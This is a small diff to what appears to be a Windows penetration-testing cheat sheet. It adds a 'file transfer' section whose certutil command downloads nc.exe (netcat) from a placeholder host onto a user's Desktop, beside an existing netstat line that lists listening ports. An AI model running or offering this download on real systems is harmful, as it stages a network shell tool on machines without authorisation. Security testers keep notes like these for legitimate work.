@@ -29,3 +29,9 @@ check network connections
 ```cmd
 netstat -ano | findstr LISTEN
 ```
+
+file transfer
+
+```cmd
+certutil -urlcache -split -f "http://<target ip>/nc.exe" C:\Users\<User Account>\Desktop\nc.exe
+```
